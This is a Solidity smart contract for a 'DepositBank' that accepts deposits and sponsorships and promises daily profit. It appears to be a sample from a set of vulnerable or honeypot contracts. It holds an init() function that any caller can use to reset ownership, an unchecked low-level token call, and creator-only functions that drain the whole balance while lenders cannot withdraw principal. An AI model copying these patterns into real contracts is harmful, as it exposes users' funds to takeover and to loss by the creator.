['pragma solidity ^0.4.18;\n', '\n', 'contract Base \n', '{\n', '    address newOwner;\n', '    address owner = msg.sender;\n', '    address creator = msg.sender;\n', '    \n', '    function isOwner()\n', '    internal\n', '    constant\n', '    returns(bool) \n', '    {\n', '        return owner == msg.sender;\n', '    }\n', '    \n', '    function changeOwner(address addr)\n', '    public\n', '    {\n', '        if(isOwner())\n', '        {\n', '            newOwner = addr;\n', '        }\n', '    }\n', '    \n', '    function confirmOwner()\n', '    public\n', '    {\n', '        if(msg.sender==newOwner)\n', '        {\n', '            owner=newOwner;\n', '        }\n', '    }\n', '    \n', '    function canDrive()\n', '    internal\n', '    constant\n', '    returns(bool)\n', '    {\n', '        return (owner == msg.sender)||(creator==msg.sender);\n', '    }\n', '    \n', '    function WthdrawAllToCreator()\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==creator)\n', '        {\n', '            creator.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function WthdrawToCreator(uint val)\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==creator)\n', '        {\n', '            creator.transfer(val);\n', '        }\n', '    }\n', '    \n', '    function WthdrawTo(address addr,uint val)\n', '    public\n', '    payable\n', '    {\n', '        if(msg.sender==creator)\n', '        {\n', '            addr.transfer(val);\n', '        }\n', '    }\n', '    \n', '    function WithdrawToken(address token, uint256 amount)\n', '    public \n', '    {\n', '        if(msg.sender==creator)\n', '        {\n', '            token.call(bytes4(sha3("transfer(address,uint256)")),creator,amount); \n', '        }\n', '    }\n', '}\n', '\n', 'contract DepositBank is Base\n', '{\n', '    uint public SponsorsQty;\n', '    \n', '    uint public CharterCapital;\n', '    \n', '    uint public ClientQty;\n', '    \n', '    uint public PrcntRate = 3;\n', '    \n', '    uint public MinPayment;\n', '    \n', '    bool paymentsAllowed;\n', '    \n', '    struct Lender \n', '    {\n', '        uint LastLendTime;\n', '        uint Amount;\n', '        uint Reserved;\n', '    }\n', '    \n', '    mapping (address => uint) public Sponsors;\n', '    \n', '    mapping (address => Lender) public Lenders;\n', '    \n', '    event StartOfPayments(address indexed calledFrom, uint time);\n', '    \n', '    event EndOfPayments(address indexed calledFrom, uint time);\n', '    \n', '    function()\n', '    payable\n', '    {\n', '        ToSponsor();\n', '    }\n', '    \n', '    \n', '    ///Constructor\n', '    function init()\n', '    Public\n', '    {\n', '        owner = msg.sender;\n', '        PrcntRate = 5;\n', '        MinPayment = 1 ether;\n', '    }\n', '    \n', '    \n', '    // investors================================================================\n', '    \n', '    function Deposit() \n', '    payable\n', '    {\n', '        FixProfit();//fix time inside\n', '        Lenders[msg.sender].Amount += msg.value;\n', '    }\n', '    \n', '    function CheckProfit(address addr) \n', '    constant \n', '    returns(uint)\n', '    {\n', '        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);\n', '    }\n', '    \n', '    function FixProfit()\n', '    {\n', '        if(Lenders[msg.sender].Amount>0)\n', '        {\n', '            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);\n', '        }\n', '        Lenders[msg.sender].LastLendTime=now;\n', '    }\n', '    \n', '    function WitdrawLenderProfit()\n', '    payable\n', '    {\n', '        if(paymentsAllowed)\n', '        {\n', '            FixProfit();\n', '            uint profit = Lenders[msg.sender].Reserved;\n', '            Lenders[msg.sender].Reserved = 0;\n', '            msg.sender.transfer(profit);        \n', '        }\n', '    }\n', '    \n', '    //==========================================================================\n', '    \n', '    // sponsors ================================================================\n', '    \n', '    function ToSponsor() \n', '    payable\n', '    {\n', '        if(msg.value>= MinPayment)\n', '        {\n', '            if(Sponsors[msg.sender]==0)SponsorsQty++;\n', '            Sponsors[msg.sender]+=msg.value;\n', '            CharterCapital+=msg.value;\n', '        }   \n', '    }\n', '    \n', '    //==========================================================================\n', '    \n', '    \n', '    function AuthorizePayments(bool val)\n', '    {\n', '        if(isOwner())\n', '        {\n', '            paymentsAllowed = val;\n', '        }\n', '    }\n', '    function StartPaymens()\n', '    {\n', '        if(isOwner())\n', '        {\n', '            AuthorizePayments(true);\n', '            StartOfPayments(msg.sender, now);\n', '        }\n', '    }\n', '    function StopPaymens()\n', '    {\n', '        if(isOwner())\n', '        {\n', '            AuthorizePayments(false);\n', '            EndOfPayments(msg.sender, now);\n', '        }\n', '    }\n', '    function WithdrawToSponsor(address _addr, uint _wei)\n', '    payable\n', '    {\n', '        if(Sponsors[_addr]>0)\n', '        {\n', '            if(isOwner())\n', '            {\n', '                if(_addr.send(_wei))\n', '                {\n', '                    if(CharterCapital>=_wei)CharterCapital-=_wei;\n', '                    else CharterCapital=0;\n', '                    }\n', '            }\n', '        }\n', '    }\n', '    modifier Public{if(!finalized)_;} bool finalized;\n', '    function Fin(){if(isOwner()){finalized = true;}}\n', '    \n', '   \n', '}']